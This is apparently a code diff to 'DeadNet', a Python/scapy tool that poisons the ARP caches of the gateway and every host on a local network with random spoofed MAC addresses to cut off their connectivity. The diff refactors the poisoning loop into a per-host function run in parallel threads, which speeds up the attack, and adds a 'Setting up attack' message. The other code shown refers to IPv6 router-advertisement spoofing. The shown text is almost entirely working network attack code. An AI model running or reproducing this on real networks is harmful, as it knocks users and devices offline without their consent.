@@ -6,6 +6,7 @@ import netifaces
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
+from concurrent.futures import ThreadPoolExecutor
 from scapy.all import *
 from utils import *
 
@@ -66,6 +67,7 @@ class DeadNet:
                 printf(f"{RED}[-]{WHITE} Windows does not support ping6, skipping...")
         else:
             printf(f"{RED}[-]{WHITE} IPv6 RA spoof is disabled, skipping ping6...")
+        printf(f"{GREEN}[+]{WHITE} Setting up attack...")
         self.abort = False
 
     def get_gateway_mac(self):
@@ -121,19 +123,22 @@ class DeadNet:
             self.user_abort()
         return ipv6_hosts
 
+    def poison_arp_single_host(self, host_ip):
+        arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(),
+                                 pdst=self.gateway_ipv4)
+        sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
+
+        # poison host's arp cache
+        arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
+        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
+
     def poison_arp(self):
         """
         * poison the gateway arp cache with a spoofed mac address for every possible host
         * poison every possible host with a spoofed mac address for the gateway
         """
-        for host_ip in self.host_ipv4s:
-            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(),
-                                     pdst=self.gateway_ipv4)
-            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
-
-            # poison host's arp cache
-            arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
-            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            executor.map(self.poison_arp_single_host, self.host_ipv4s)
 
     def poison_ra(self):
         """
